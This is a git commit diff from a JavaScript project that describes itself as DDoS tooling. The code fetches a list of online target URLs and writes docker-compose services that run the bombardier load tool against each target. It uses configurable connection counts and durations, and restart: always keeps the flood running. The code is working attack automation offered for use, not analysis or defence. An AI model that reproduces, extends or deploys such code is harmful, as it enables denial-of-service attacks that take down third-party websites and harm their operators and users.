d6a9a25a4d3ece958f06152a004900e7089284b3
SergeyGuliy <sergey.guliy.92@gmail.com>
2022-03-01 22:42:25 +0300

    Added doc for setup DDos server on digital ocean

--- fetch.js
+++ fetch.js
@@ -7,14 +7,13 @@ export function fetchTargets() {
 
             const online = resp.data.filter(i => i.online)
             let justLinks = online.map(i => i.url)
-            justLinks = justLinks.map(link => {
-                if (link.includes('http://')) {
-                    return link.split('http://')[1]
-                } else if (link.includes('https://')) {
-                    return link.split('https://')[1]
-                }
-            })
-            justLinks = justLinks.map(link => link.split('/')[0])
+            // justLinks = justLinks.map(link => {
+            //     if (link.includes('http://')) {
+            //         return link.split('http://')[1]
+            //     } else if (link.includes('https://')) {
+            //         return link.split('https://')[1]
+            //     }
+            // })
 
             justLinks.forEach(link => {
                 if (!notSameLinks.includes(justLinks)) notSameLinks.push(link)
--- scripts/generateContainerItem.js
+++ scripts/generateContainerItem.js
@@ -1,13 +1,24 @@
 import { DDOS_DEFAULT_DURATION, DDOS_DEFAULT_CONNECTIONS } from '../constants/DEFAULT_VALUES.js'
 
+
+function getName(name) {
+    if (name.includes('http://')) {
+        return name.split('http://')[1].split('/')[0]
+    } else if (name.includes('https://')) {
+        return name.split('https://')[1].split('/')[0]
+    }
+}
+
 export function generateContainerItem (item) {
-    let link, duration, connections
+    let link, duration, connections, name
     if (typeof item === "string") {
         link = item;
+        name = getName(item);
         duration = DDOS_DEFAULT_DURATION;
         connections = DDOS_DEFAULT_CONNECTIONS;
     } else if (typeof item === "object" && item.link) {
         link = item.link;
+        name = getName(item.link);
         duration = item.duration || DDOS_DEFAULT_DURATION;
         connections = item.connections || DDOS_DEFAULT_CONNECTIONS;
     }
@@ -16,7 +27,7 @@ export function generateContainerItem (item) {
 
     return '\n' +
         `  ${UID}:\n` +
-        `    container_name: ${link}_${UID}\n` +
+        `    container_name: ${name}_${UID}\n` +
         `    image: alpine/bombardier\n` +
         `    restart: always\n` +
         `    command: -c ${connections} -d ${duration} -l ${link}` +
